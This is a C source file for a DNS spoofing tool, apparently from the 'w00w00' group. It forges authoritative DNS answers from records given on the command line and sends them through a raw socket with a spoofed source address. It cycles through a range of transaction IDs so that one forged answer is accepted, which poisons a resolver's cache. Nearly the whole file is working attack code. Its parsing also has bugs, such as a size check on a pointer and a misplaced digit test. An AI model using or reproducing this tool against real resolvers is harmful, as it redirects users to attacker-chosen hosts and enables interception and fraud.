#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "spoof.c"
 
#define DC_A     1
#define DC_NS    2
#define DC_CNAME 5
#define DC_SOA   6
#define DC_WKS   11
#define DC_PTR   12
#define DC_HINFO 13
#define DC_MINFO 14
#define DC_MX    15
#define DC_TXT   16

#define ERROR      -1
#define MAXBUFSIZE 64*1024

typedef struct {
  unsigned short id;

  unsigned char  rd:1;           /* recursion desired                      */
  unsigned char  tc:1;           /* truncated message                      */
  unsigned char  aa:1;           /* authoritive answer                     */
  unsigned char  opcode:4;       /* purpose of message                     */
  unsigned char  qr:1;           /* response flag                          */

  unsigned char  rcode:4;        /* response code                          */
  unsigned char  unused:2;       /* unused bits                            */
  unsigned char  pr:1;           /* primary server required (non standard) */
  unsigned char  ra:1;           /* recursion available                    */

  unsigned short qdcount;
  unsigned short ancount;
  unsigned short nscount;
  unsigned short arcount;
} dnsheaderrec;

typedef struct {
  char buf[256];
  char label[256];
  unsigned long  ttl;
  unsigned short type;
  unsigned short class;
  unsigned short buflen;
  unsigned short labellen;
} dnsrrrec;

typedef struct {
  dnsheaderrec h;
  dnsrrrec qd[20];
  dnsrrrec an[20];
  dnsrrrec ns[20];
  dnsrrrec ar[20];
} dnsrec;

char *dnssprintflabel(char *s, char *buf, char *p);
char *dnsaddlabel(char *p, char *label);
void  dnstxt2rr(dnsrrrec *rr, char *b);
void  dnsbuildpacket(dnsrec *dns, short qdcount, short ancount, 
                     short nscount, short arcount, ...);
char *dnsaddbuf(char *p, void *buf, short len);
int   dnsmakerawpacket(dnsrec *dns, char *buf);
char *ip_to_arpa(char *ip);
char *arparize(char *ip);
char *get_token(char **src, char *token_sep);


char *dnssprintflabel(char *s, char *buf, char *p)
{
  unsigned short i,len;
  char *b = NULL;

  len = (unsigned short) *(p++);
  while (len) {
     while (len >= 0xC0) {
       if (!b) b = p + 1;
       p = buf + (ntohs(*((unsigned short *)(p-1))) & ~0xC000);
       len = (unsigned short) *(p++);
     }

     for (i = 0; i < len; i++) *(s++) = *(p++);

     *(s++)='.';

     len = (unsigned short) * (p++);
  }

  *(s++) = 0;

  if (b) return(b);

  return(p);
}

char *dnsaddlabel(char *p, char *label)
{
  char *p1;

  while ((*label) && (label)) {
    if ((*label == '.') && (!*(label+1)))
      break;

    p1 = strchr(label, '.');

    if (!p1)
      p1 = strchr(label, 0);

    *(p++) = p1-label;
    memcpy(p, label, p1-label);
    p += p1-label;

    label = p1;
    if (*p1)
      label++;
  }

  *(p++)=0;

  return(p);
}

#define DEFAULTTTL 60*10

void dnstxt2rr(dnsrrrec *rr, char *b)
{
  char *tok[20], *p;
  unsigned short numt = 0, i;
  static char *buf = NULL;

  if (!buf) {
    if ((buf = malloc(1024)) == NULL) {
      perror("malloc");
      exit(ERROR);
    }
  }

  strncpy(buf, b, sizeof(buf));
  p = strtok(buf," \t");

  do {
    tok[numt++] = p;
  } while ((p = strtok(NULL, " \t")));

  p = dnsaddlabel(rr->label, tok[0]);
  rr->labellen = p-rr->label;

  i = 1;

  if (isdigit(*p))
      rr->ttl = htonl(atol(tok[i++]));
   else
      rr->ttl = htonl(DEFAULTTTL);

  if (strcmp(tok[i], "IN") == 0)
    i++;

  rr->class = htons(1);

  if (strcmp(tok[i], "A") == 0) {
     i++;
     rr->type = htons(DC_A);

     if (i < numt) {
        inet_aton(tok[i],rr->buf);
        rr->buflen=4;
     } else
        rr->buflen=0;
  
     return;
  }

  if (strcmp(tok[i], "CNAME") == 0) {
     i++;
     rr->type = htons(DC_CNAME);

     if (i < numt) {
        p = dnsaddlabel(rr->buf,tok[i]);
        rr->buflen=p-rr->buf;
      } else
        rr->buflen=0;

      return;
  }

  if (strcmp(tok[i],"NS") == 0) {
     i++;
     rr->type = htons(DC_NS);

     if (i < numt) {
        p = dnsaddlabel(rr->buf,tok[i]);
        rr->buflen=p-rr->buf;
      } else
        rr->buflen=0;

    return;
  }

  if (strcmp(tok[i], "PTR") == 0) {
     i++;
     rr->type=htons(DC_PTR);

     if (i < numt) {
        p=dnsaddlabel(rr->buf,tok[i]);
        rr->buflen=p-rr->buf;
     } else
      rr->buflen=0;
    return;
  }

  if (strcmp(tok[i],"MX") == 0) {
     i++;
     rr->type=htons(DC_MX);
     if (i < numt) {
        p =rr->buf;

        *((unsigned short *)p) = htons(atoi(tok[i++])); 
        p += 2;

        p = dnsaddlabel(p,tok[i]);

        rr->buflen = p-rr->buf;
    } else
       rr->buflen = 0;
 
    return;
  }
}


char *dnsaddbuf(char *p, void *buf, short len)
{
  memcpy(p, buf, len);
  return(p+len);
}

int dnsmakerawpacket(dnsrec *dns, char *buf)
{
  char *p;
  int i;
  unsigned short len;

  memcpy(buf, &dns->h, sizeof(dnsheaderrec));

  p=buf+sizeof(dnsheaderrec);

  /********** Query ***********/
  for (i = 0; i < ntohs(dns->h.qdcount); i++) {
     printf("add query\n");
     p = dnsaddbuf(p,  dns->qd[i].label, dns->qd[i].labellen);
     p = dnsaddbuf(p, &dns->qd[i].type,  2);
     p = dnsaddbuf(p, &dns->qd[i].class, 2);
  }

  /********** Answer ***********/
  for (i=0; i <ntohs(dns->h.ancount); i++) {

     printf("add answer\n");

     p   = dnsaddbuf(p,  dns->an[i].label, dns->an[i].labellen);
     p   = dnsaddbuf(p, &dns->an[i].type,  2);
     p   = dnsaddbuf(p, &dns->an[i].class, 2);
     p   = dnsaddbuf(p, &dns->an[i].ttl,   4);

     len = htons(dns->an[i].buflen);

     p   = dnsaddbuf(p, &len, 2);
     p   = dnsaddbuf(p, dns->an[i].buf, dns->an[i].buflen);
  }

  /********** Nameservers ************/
  for (i=0; i < ntohs(dns->h.nscount); i++) {
     printf("add nameserevr\n");
     p   = dnsaddbuf(p, dns->ns[i].label,  dns->ns[i].labellen);
     p   = dnsaddbuf(p, &dns->ns[i].type,  2);
     p   = dnsaddbuf(p, &dns->ns[i].class, 2);
     p   = dnsaddbuf(p, &dns->ns[i].ttl,   4);

     len = htons(dns->ns[i].buflen);

     p   = dnsaddbuf(p, &len, 2);
     p   = dnsaddbuf(p, dns->ns[i].buf, dns->ns[i].buflen);
  }

  /********** Additional ************/
  for (i=0; i < ntohs(dns->h.arcount); i++) {
     printf("add info\n");
     p   = dnsaddbuf(p, dns->ar[i].label,  dns->ar[i].labellen);
     p   = dnsaddbuf(p, &dns->ar[i].type,  2);
     p   = dnsaddbuf(p, &dns->ar[i].class, 2);
     p   = dnsaddbuf(p, &dns->ar[i].ttl,   4);

     len = htons(dns->ar[i].buflen);

     p   = dnsaddbuf(p, &len, 2);
     p   = dnsaddbuf(p, dns->ar[i].buf, dns->ar[i].buflen);
  }

  return(p-buf);
}


char *get_token(src, token_sep)
   char **src;
   char *token_sep;
{
  char    *tok;

  if (!(src && *src && **src))
	return NULL;

  while (**src && strchr(token_sep, **src))
	(*src)++;

  if (**src)
     	tok = *src;
  else
	return NULL;

  *src = strpbrk(*src, token_sep);

  if (*src) {
	**src = '\0';
	(*src)++;

	while(**src && strchr(token_sep, **src))
		(*src)++;
  } else
	*src = "";

  return tok;
}

char *ip_to_arpa(char *ip)
{
  char *arpablock, *bit_a, *bit_b, *bit_c;
  char *oomf;

  arpablock = NULL;
  arpablock = (char *)malloc(64);

  oomf = (char *)malloc(64);

  strncpy(oomf, ip, sizeof(oomf));

  bit_a = get_token(&oomf, ".");
  bit_b = get_token(&oomf, ".");
  bit_c = get_token(&oomf, ".");
	
  sprintf(arpablock, "%s.%s.%s.in-addr.arpa", bit_c, bit_b, bit_a);

  return arpablock;

}

char *arparize(char *ip)
{
  char *arpa, *bit_a, *bit_b, *bit_c, *bit_d;
  char *oomf;

  arpa = NULL;
  arpa = (char *)malloc(64);
  oomf = (char *)malloc(64);

  strncpy(oomf, ip, sizeof(oomf));

  bit_a = get_token(&oomf, ".");
  bit_b = get_token(&oomf, ".");
  bit_c = get_token(&oomf, ".");
  bit_d = oomf;
	
  sprintf(arpa, "%s.%s.%s.%s.in-addr.arpa", bit_d, bit_c, bit_b, bit_a);

  return arpa;

}

void main(int argc, char **argv)
{
  int len;
  int raw_ip;

  dnsrec dns;
  dnsheaderrec* dnshdr;

  char packet[MAXBUFSIZE];

  unsigned short dport;
  unsigned long sip, dip;
  unsigned short id_start, id_cur, id_end;

  printf("w00w00!\n");

  if (argc < 6) {
    printf("usage: %s <P-A> <source> <dest> <question> <answer> <id start> "
                     "<nb id> <dest port>\n", argv[0]);
   		
    printf("example: %s 192.165.12.1 145.23.2.1 \"youpi.youpla.boum. IN A\""
    	   " \"youpi.youpla.boum. IN A 1.2.3.4\" 65535 56 1059\n", argv[0]);

    exit(0);
  }

  dnshdr = (dnsheaderrec *)(packet+20+8);

  if ((raw_ip = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
     perror("socket");
     exit(ERROR);
  }


/* on rempli le header du message dns */

  printf("header du message dns\n");

  memset(&(dns.h),0,sizeof(dns.h));

  dns.h.id = htons(15);
  dns.h.rd = 1;
  dns.h.aa = 1;
  dns.h.qr = 1;
  dns.h.ra = 1;
  dns.h.qdcount = htons(1);
  dns.h.ancount = htons(1);
  dns.h.nscount = htons(0);
  dns.h.arcount = htons(0);

  /* on ajoute les RR */

  printf("ajoute les RR \n");

  dnstxt2rr(&(dns.qd[0]),argv[3]);
  dnstxt2rr(&(dns.an[0]),argv[4]);

  id_start = atoi(argv[5]);
  id_end   = id_start+atoi(argv[6]);

  dport    = atoi(argv[7]);

  sip 	   = inet_addr(argv[1]);
  dip 	   = inet_addr(argv[2]);

  for (id_cur = id_start; id_cur < id_end; id_cur++) {
    dns.h.id  = htons(id_cur);

    printf("make ze raw packet (id=%i)\n",id_cur);

    len = dnsmakerawpacket(&dns,packet);
    udp_send(raw_ip, sip, dip, 53, dport, packet, len);

  }
  
}
